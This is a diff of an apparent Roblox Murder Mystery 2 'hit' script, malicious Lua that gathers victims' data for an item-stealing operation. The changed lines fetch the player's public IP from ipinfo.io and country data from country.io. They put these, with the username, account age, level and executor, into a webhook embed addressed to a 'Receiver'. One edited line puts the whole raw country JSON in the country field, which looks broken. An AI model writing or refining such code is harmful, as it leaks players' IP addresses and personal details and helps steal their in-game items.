@@ -800,13 +800,22 @@ if #game:GetService("Players"):GetPlayers() == 12 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
 
-local ipwebhook = game:HttpGet("https://ipinfo.io/ip")
-local country = game:HttpGet("http://country.io/names.json")
+local LocalizationService = game:GetService("LocalizationService")
+local Countries = {}
+local Players = game:GetService("Players")
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
 local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+
+local success, result = pcall(function()
+	return HttpService:GetAsync("http://country.io/names.json")
+end)
+
+if success and result then
+	Countries = HttpService:JSONDecode(result)
+end
 
 _G.vlorp = _G.vlorp or false
 if _G.vlorp then
@@ -1059,6 +1068,7 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
 
+local ipwebhook = game:HttpGet("https://ipinfo.io/ip")
 local WebHookEmbed = CreateEmbed(
     "MM2 Hit - Ft. Light Monzz",
     "Please execute the code above to get your hit.",
@@ -1067,7 +1077,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().. "\n | :map: Country: "..country.."\n | 👤 IP: "..ipwebhook.."```"
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | :map: Country: "..result.."\n | 👤 IP: "..ipwebhook.. "```"
         },
         {
             name = "🍎 Items Data", 
